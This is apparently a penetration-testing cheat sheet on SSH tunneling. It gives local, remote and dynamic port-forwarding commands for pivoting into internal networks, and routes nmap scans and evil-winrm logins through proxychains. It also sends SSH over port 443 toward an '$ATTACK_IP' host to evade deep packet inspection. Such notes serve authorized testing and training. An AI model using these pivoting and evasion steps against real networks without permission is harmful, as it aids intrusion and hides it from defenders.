# SSH Tunneling

## Local Port Forwarding
```bash
# Forward local port to target through pivot
ssh -L 8080:target.internal:80 user@pivot_ip

# Example: Access internal web server
ssh -L 8080:10.0.0.100:80 user@10.10.10.10
# Now browse http://localhost:8080
```

## Remote Port Forwarding
```bash
# Forward pivot's port back to your machine
ssh -R 8080:localhost:80 user@your_ip

# Example: Give target access to your local webserver
ssh -R 8000:localhost:80 root@$ATTACK_IP
```

## Dynamic Port Forwarding (SOCKS Proxy)
```bash
# Create SOCKS proxy on pivot
ssh -D 1080 user@pivot_ip

# Use with proxychains
proxychains nmap -sT -p 80,443,445 10.0.0.0/24
proxychains evil-winrm -i 10.0.0.100 -u admin -p pass
```

## SSH Over Port 443 (DPI Evasion)
```bash
# SSH on port 443 often passes through DPI (looks like HTTPS)
ssh -D 1080 -p 443 user@$ATTACK_IP
```
